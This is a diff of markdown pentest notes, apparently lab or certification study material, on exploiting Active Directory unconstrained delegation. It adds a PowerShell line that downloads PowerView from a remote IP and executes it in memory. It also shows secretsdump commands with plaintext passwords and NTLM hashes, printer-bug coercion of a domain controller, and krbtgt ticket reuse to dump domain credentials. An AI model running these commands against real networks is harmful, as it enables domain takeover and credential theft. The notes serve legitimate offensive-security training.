@@ -10,14 +10,13 @@
 
 ## Enumeration
 
-```powershell
-Import-Module powerview.ps1
-Get-DomainComputer -Unconstrained
-# Domain Controllers are configured with unconstrained delegation by default
+<pre class="language-powershell"><code class="lang-powershell">iex (new-object net.web-client).downloadstring('http://192.168.45.198/PowerView.ps1')
+<strong>Get-DomainComputer -Unconstrained
+</strong># Domain Controllers are configured with unconstrained delegation by default
 
 #To know the IP of the target
 nslookup appsrv01
-```
+</code></pre>
 
 ## Exploitation
 
@@ -63,7 +62,10 @@ nslookup appsrv01
 
       * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1).png>)
         *   ```powershell
+            # Dump as domain user
             impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
+            # Dump as built-in admin
+            impacket-secretsdump administrator:2J8u{2e@192.168.187.121
             ```
 
 
@@ -94,12 +96,17 @@ nslookup appsrv01
 
       * Trigger Authentication from the DC Using the Print Spooler Bug
         *   ```powershell
-            python3 krbrelayx.py -aesKey python3 printerbug.py "corp.com/FILES01$"@dc01.corp.com -hashes aad3b435b51404eeaad3b435b51404ee:22a506a9cabc86c93dda21decc4b2e75 "attacker.corp.com"
+            python3 printerbug.py "corp.com/FILES01$"@dc01.corp.com -hashes aad3b435b51404eeaad3b435b51404ee:22a506a9cabc86c93dda21decc4b2e75 "attacker.corp.com"
             ```
 
 
         * If errors out --> rerun the impacket secretdump again to obtain the computer hashes
         * Check if got ccache file in the directory
+      * Importing the ccache file
+        * ```bash
+          mv DC01\$@CORP.COM_krbtgt@CORP.COM.ccache administrator.ccache
+          export KRB5CCNAME=administrator.ccache
+          ```
       * Use the Captured TGT to Dump Credentials from the DC
         *   ```powershell
             impacket-secretsdump -k -no-pass "corp.com/DC01$"@dc01.corp.com
@@ -128,6 +135,13 @@ nslookup appsrv01
         * [Dump administrator hash](lateral-movement.md#dump-domain-admin-hash-from-dc)
 
 </details>
+
+```
+mv DC03\$@INFINITY.COM_krbtgt@INFINITY.COM.ccache administrator.ccache
+export KRB5CCNAME=administrator.ccache
+```
+
+
 
 <details>
 
